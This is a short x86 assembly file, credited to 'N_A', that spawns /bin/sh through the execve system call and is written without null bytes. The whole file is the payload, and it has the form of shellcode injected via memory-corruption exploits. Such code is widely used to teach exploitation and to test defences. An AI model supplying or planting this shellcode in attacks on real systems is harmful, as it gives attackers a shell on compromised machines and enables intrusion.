#This is a /bin/sh program with out any null bytes
#by N_A


.section .text

.globl _start

_start:

	xorl %eax,%eax		
	pushl %eax		
	pushl $0x68732f2f	#//sh is pushed onto the stack
	pushl $0x6e69622f	#/bin is pushed onto the stack
	movb  $0xb, %al		
	movl %esp, %ebx		#%ebx contains "/bin//sh"
	xorl %edx, %edx		#%edx = 0
	pushl %edx		#nullbyte
	pushl %ebx		#push "/bin//sh"
	movl %esp, %ecx		
	int $0x80		

